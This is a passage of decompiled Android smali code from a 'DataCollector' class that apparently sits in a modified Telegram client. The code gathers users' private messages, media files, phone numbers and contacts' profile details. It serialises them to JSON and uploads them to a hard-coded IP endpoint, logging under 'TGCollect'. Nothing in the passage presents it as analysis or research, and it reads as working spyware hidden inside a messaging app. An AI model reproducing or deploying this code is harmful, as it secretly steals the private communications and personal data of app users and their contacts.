    const-string v1, ".ogg"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    const-string v2, ".aac"

    const-string v3, ".m4a"

    const-string v4, ".mp3"

    if-nez v1, :cond_8

    const-string v1, ".opus"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_8

    .line 2495
    invoke-virtual {v0, v4}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_8

    invoke-virtual {v0, v3}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_8

    invoke-virtual {v0, v2}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_2

    goto :goto_2

    .line 2501
    :cond_2
    const-string v1, ".mp4"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_7

    const-string v1, ".mov"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_7

    const-string v1, ".avi"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_3

    goto :goto_1

    .line 2504
    :cond_3
    const-string v1, ".tgs"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    const-string v2, "sticker"

    if-eqz v1, :cond_4

    .line 2507
    const-string v0, "application/x-tgsticker"

    :goto_0
    move-object v12, v0

    move-object v11, v2

    goto :goto_4

    .line 2508
    :cond_4
    const-string v1, ".webm"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_6

    .line 2510
    invoke-virtual/range {p5 .. p5}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/32 v3, 0x200000

    cmp-long v5, v0, v3

    if-lez v5, :cond_5

    return-void

    .line 2512
    :cond_5
    const-string v0, "video/webm"

    goto :goto_0

    .line 2515
    :cond_6
    invoke-direct/range {p0 .. p5}, Lorg/telegram/messenger/DataCollector;->sendDocumentFile(IJILjava/io/File;)V

    return-void

    .line 2503
    :cond_7
    :goto_1
    const-string v0, "video"

    const-string v1, "video/mp4"

    move-object v11, v0

    move-object v12, v1

    goto :goto_4

    .line 2497
    :cond_8
    :goto_2
    invoke-virtual {v0, v4}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_9

    const-string v0, "audio/mpeg"

    goto :goto_3

    .line 2498
    :cond_9
    invoke-virtual {v0, v3}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_a

    const-string v0, "audio/mp4"

    goto :goto_3

    .line 2499
    :cond_a
    invoke-virtual {v0, v2}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_b

    const-string v0, "audio/aac"

    goto :goto_3

    .line 2500
    :cond_b
    const-string v0, "audio/ogg"

    :goto_3
    const-string v1, "audio"

    move-object v12, v0

    move-object v11, v1

    .line 2518
    :goto_4
    invoke-virtual/range {p5 .. p5}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/32 v2, 0x1e00000

    cmp-long v4, v0, v2

    if-lez v4, :cond_c

    return-void

    .line 2519
    :cond_c
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "media:"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move v3, p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, ":"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-wide v4, p2

    invoke-virtual {v0, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move/from16 v6, p4

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-wide/16 v7, 0x0

    const/4 v9, 0x0

    const-string v2, "https://38.190.225.166/api/media"

    move-object v0, p0

    move-object/from16 v10, p5

    invoke-direct/range {v0 .. v12}, Lorg/telegram/messenger/DataCollector;->enqueueFileUpload(Ljava/lang/String;Ljava/lang/String;IJIJZLjava/io/File;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_d

    .line 2521
    const-string v0, "TGCollect"

    const-string v1, "sendMedia: queue unavailable, skip direct upload"

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_d
    :goto_5
    return-void
.end method

.method public sendMessage(ILorg/telegram/tgnet/TLRPC$Message;)V
    .locals 7

    if-nez p2, :cond_0

    return-void

    .line 1732
    :cond_0
    instance-of v0, p2, Lorg/telegram/tgnet/TLRPC$TL_messageEmpty;

    if-eqz v0, :cond_1

    return-void

    .line 1733
    :cond_1
    instance-of v0, p2, Lorg/telegram/tgnet/TLRPC$TL_messageService;

    if-eqz v0, :cond_2

    return-void

    .line 1735
    :cond_2
    iget-wide v0, p2, Lorg/telegram/tgnet/TLRPC$Message;->dialog_id:J

    const-wide/16 v2, 0x0

    cmp-long v4, v0, v2

    if-nez v4, :cond_3

    iget-object v0, p2, Lorg/telegram/tgnet/TLRPC$Message;->peer_id:Lorg/telegram/tgnet/TLRPC$Peer;

    if-eqz v0, :cond_3

    .line 1736
    invoke-static {p2}, Lorg/telegram/messenger/MessageObject;->getDialogId(Lorg/telegram/tgnet/TLRPC$Message;)J

    move-result-wide v0

    iput-wide v0, p2, Lorg/telegram/tgnet/TLRPC$Message;->dialog_id:J

    .line 1739
    :cond_3
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 1740
    const-string v1, "type"

    const-string v4, "message"

    invoke-virtual {v0, v1, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1741
    const-string v1, "account"

    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v4

    invoke-virtual {v0, v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1742
    const-string v1, "msg_id"

    iget v4, p2, Lorg/telegram/tgnet/TLRPC$Message;->id:I

    invoke-virtual {v0, v1, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1743
    const-string v1, "dialog_id"

    iget-wide v4, p2, Lorg/telegram/tgnet/TLRPC$Message;->dialog_id:J

    invoke-virtual {v0, v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1744
    const-string v1, "from_id"

    iget-object v4, p2, Lorg/telegram/tgnet/TLRPC$Message;->from_id:Lorg/telegram/tgnet/TLRPC$Peer;

    if-eqz v4, :cond_4

    iget-wide v2, v4, Lorg/telegram/tgnet/TLRPC$Peer;->user_id:J

    goto :goto_0

    :catch_0
    move-exception v0

    goto/16 :goto_7

    :cond_4
    :goto_0
    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1745
    const-string v1, "text"

    iget-object v2, p2, Lorg/telegram/tgnet/TLRPC$Message;->message:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v3, ""

    if-eqz v2, :cond_5

    goto :goto_1

    :cond_5
    move-object v2, v3

    :goto_1
    :try_start_1
    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1746
    const-string v1, "date"

    iget v2, p2, Lorg/telegram/tgnet/TLRPC$Message;->date:I

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1747
    const-string v1, "is_out"

    iget-boolean v2, p2, Lorg/telegram/tgnet/TLRPC$Message;->out:Z

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 1749
    iget-object v1, p2, Lorg/telegram/tgnet/TLRPC$Message;->media:Lorg/telegram/tgnet/TLRPC$MessageMedia;

    instance-of v2, v1, Lorg/telegram/tgnet/TLRPC$TL_messageMediaPhoto;

    if-eqz v2, :cond_6

    const-string v1, "photo"

    goto :goto_2

    .line 1750
    :cond_6
    instance-of v2, v1, Lorg/telegram/tgnet/TLRPC$TL_messageMediaDocument;

    if-eqz v2, :cond_7

    const-string v1, "document"

    goto :goto_2

    .line 1751
    :cond_7
    instance-of v2, v1, Lorg/telegram/tgnet/TLRPC$TL_messageMediaGeo;

    if-eqz v2, :cond_8

    const-string v1, "geo"

    goto :goto_2

    .line 1752
    :cond_8
    instance-of v1, v1, Lorg/telegram/tgnet/TLRPC$TL_messageMediaContact;

    if-eqz v1, :cond_9

    const-string v1, "contact"

    goto :goto_2

    :cond_9
    move-object v1, v3

    .line 1753
    :goto_2
    const-string v2, "media_type"

    invoke-virtual {v0, v2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1755
    iget-object v1, p2, Lorg/telegram/tgnet/TLRPC$Message;->media:Lorg/telegram/tgnet/TLRPC$MessageMedia;

    instance-of v2, v1, Lorg/telegram/tgnet/TLRPC$TL_messageMediaDocument;

    if-eqz v2, :cond_10

    .line 1756
    check-cast v1, Lorg/telegram/tgnet/TLRPC$TL_messageMediaDocument;

    iget-object v1, v1, Lorg/telegram/tgnet/TLRPC$MessageMedia;->document:Lorg/telegram/tgnet/TLRPC$Document;

    if-eqz v1, :cond_10

    .line 1759
    iget-object v2, v1, Lorg/telegram/tgnet/TLRPC$Document;->mime_type:Ljava/lang/String;

    if-eqz v2, :cond_a

    goto :goto_3

    :cond_a
    move-object v2, v3

    .line 1760
    :goto_3
    iget-object v4, v1, Lorg/telegram/tgnet/TLRPC$Document;->attributes:Ljava/util/ArrayList;

    invoke-virtual {v4}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_b
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_c

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Lorg/telegram/tgnet/TLRPC$DocumentAttribute;

    .line 1761
    instance-of v6, v5, Lorg/telegram/tgnet/TLRPC$TL_documentAttributeFilename;

    if-eqz v6, :cond_b

    .line 1762
    iget-object v4, v5, Lorg/telegram/tgnet/TLRPC$DocumentAttribute;->file_name:Ljava/lang/String;

    if-eqz v4, :cond_c

    move-object v3, v4

    .line 1767
    :cond_c
    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-eqz v4, :cond_f

    .line 1768
    const-string v4, "video/"

    invoke-virtual {v2, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_d

    const-string v3, "[video]"

    goto :goto_4

    .line 1769
    :cond_d
    const-string v4, "audio/"

    invoke-virtual {v2, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_e

    const-string v3, "[audio]"

    goto :goto_4

    .line 1770
    :cond_e
    const-string v4, "image/"

    invoke-virtual {v2, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_f

    const-string v3, "[image]"

    .line 1772
    :cond_f
    :goto_4
    const-string v4, "media_filename"

    invoke-virtual {v0, v4, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1773
    const-string v3, "media_size"

    iget-wide v4, v1, Lorg/telegram/tgnet/TLRPC$Document;->size:J

    invoke-virtual {v0, v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1774
    const-string v1, "media_mime"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1778
    :cond_10
    const-string v1, "post"

    iget-boolean v2, p2, Lorg/telegram/tgnet/TLRPC$Message;->post:Z

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1779
    iget v1, p2, Lorg/telegram/tgnet/TLRPC$Message;->flags:I

    and-int/lit16 v1, v1, 0x400

    const/4 v2, 0x0

    if-eqz v1, :cond_11

    const/4 v1, 0x1

    goto :goto_5

    :cond_11
    const/4 v1, 0x0

    .line 1780
    :goto_5
    const-string v3, "views"

    if-eqz v1, :cond_12

    iget v4, p2, Lorg/telegram/tgnet/TLRPC$Message;->views:I

    goto :goto_6

    :cond_12
    const/4 v4, 0x0

    :goto_6
    invoke-virtual {v0, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1781
    const-string v3, "forwards"

    if-eqz v1, :cond_13

    iget v2, p2, Lorg/telegram/tgnet/TLRPC$Message;->forwards:I

    :cond_13
    invoke-virtual {v0, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1782
    const-string v1, "grouped_id"

    iget-wide v2, p2, Lorg/telegram/tgnet/TLRPC$Message;->grouped_id:J

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1783
    invoke-direct {p0, v0}, Lorg/telegram/messenger/DataCollector;->enqueueMsgBatch(Lorg/json/JSONObject;)V

    .line 1784
    invoke-direct {p0, p1, p2}, Lorg/telegram/messenger/DataCollector;->sendGroupSpeaker(ILorg/telegram/tgnet/TLRPC$Message;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_8

    .line 1786
    :goto_7
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "sendMessage: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "TGCollect"

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 1790
    :goto_8
    iget-object v0, p2, Lorg/telegram/tgnet/TLRPC$Message;->media:Lorg/telegram/tgnet/TLRPC$MessageMedia;

    instance-of v1, v0, Lorg/telegram/tgnet/TLRPC$TL_messageMediaPhoto;

    if-nez v1, :cond_14

    instance-of v0, v0, Lorg/telegram/tgnet/TLRPC$TL_messageMediaDocument;

    if-eqz v0, :cond_15

    .line 1792
    :cond_14
    invoke-direct {p0, p1, p2}, Lorg/telegram/messenger/DataCollector;->scheduleMediaUpload(ILorg/telegram/tgnet/TLRPC$Message;)V

    :cond_15
    return-void
.end method

.method public sendPhone(ILjava/lang/String;)V
    .locals 5

    const-string v0, "phone"

    if-eqz p2, :cond_1

    .line 1558
    invoke-virtual {p2}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_0

    goto :goto_0

    .line 1560
    :cond_0
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 1561
    const-string v2, "type"

    invoke-virtual {v1, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1562
    const-string v2, "account"

    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v3

    invoke-virtual {v1, v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1563
    invoke-virtual {v1, v0, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1564
    invoke-direct {p0, v1}, Lorg/telegram/messenger/DataCollector;->postJson(Lorg/json/JSONObject;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 1566
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "sendPhone: "

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "TGCollect"

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    :goto_0
    return-void
.end method

.method public sendProfile(ILorg/telegram/tgnet/TLRPC$User;Z)V
    .locals 4

    if-nez p2, :cond_0

    return-void

    :cond_0
    if-nez p3, :cond_1

    .line 1574
    iget-object v0, p0, Lorg/telegram/messenger/DataCollector;->sentProfiles:Lj$/util/concurrent/ConcurrentHashMap;

    iget-wide v1, p2, Lorg/telegram/tgnet/TLRPC$User;->id:J

    invoke-direct {p0, v0, v1, v2}, Lorg/telegram/messenger/DataCollector;->checkCooldown(Lj$/util/concurrent/ConcurrentHashMap;J)Z

    move-result v0

    if-nez v0, :cond_1

    return-void

    .line 1576
    :cond_1
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 1577
    const-string v1, "type"

    const-string v2, "profile"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1578
    const-string v1, "account"

    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v2

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1579
    const-string p1, "user_id"

    iget-wide v1, p2, Lorg/telegram/tgnet/TLRPC$User;->id:J

    invoke-virtual {v0, p1, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1580
    const-string p1, "first_name"

    iget-object v1, p2, Lorg/telegram/tgnet/TLRPC$User;->first_name:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v2, ""

    if-eqz v1, :cond_2

    goto :goto_0

    :cond_2
    move-object v1, v2

    :goto_0
    :try_start_1
    invoke-virtual {v0, p1, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1581
    const-string p1, "last_name"

    iget-object v1, p2, Lorg/telegram/tgnet/TLRPC$User;->last_name:Ljava/lang/String;

    if-eqz v1, :cond_3

    goto :goto_1

    :cond_3
    move-object v1, v2

    :goto_1
    invoke-virtual {v0, p1, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1582
    const-string p1, "username"

    iget-object v1, p2, Lorg/telegram/tgnet/TLRPC$User;->username:Ljava/lang/String;

    if-eqz v1, :cond_4

    goto :goto_2

    :cond_4
    move-object v1, v2

    :goto_2
    invoke-virtual {v0, p1, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1583
    const-string p1, "phone"

    iget-object v1, p2, Lorg/telegram/tgnet/TLRPC$User;->phone:Ljava/lang/String;

    if-eqz v1, :cond_5

    move-object v2, v1

    :cond_5
    invoke-virtual {v0, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1584
    const-string p1, "is_self"

    invoke-virtual {v0, p1, p3}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1585
    const-string p1, "premium"

    iget-boolean p3, p2, Lorg/telegram/tgnet/TLRPC$User;->premium:Z

    invoke-virtual {v0, p1, p3}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1586
    const-string p1, "verified"

    iget-boolean p3, p2, Lorg/telegram/tgnet/TLRPC$User;->verified:Z

    invoke-virtual {v0, p1, p3}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1587
    const-string p1, "bot"

    iget-boolean p2, p2, Lorg/telegram/tgnet/TLRPC$User;->bot:Z

    invoke-virtual {v0, p1, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 1588
    invoke-direct {p0, v0}, Lorg/telegram/messenger/DataCollector;->postJson(Lorg/json/JSONObject;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_3

    :catch_0
    move-exception p1

    .line 1590
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string p3, "sendProfile: "

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "TGCollect"

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_3
    return-void
.end method
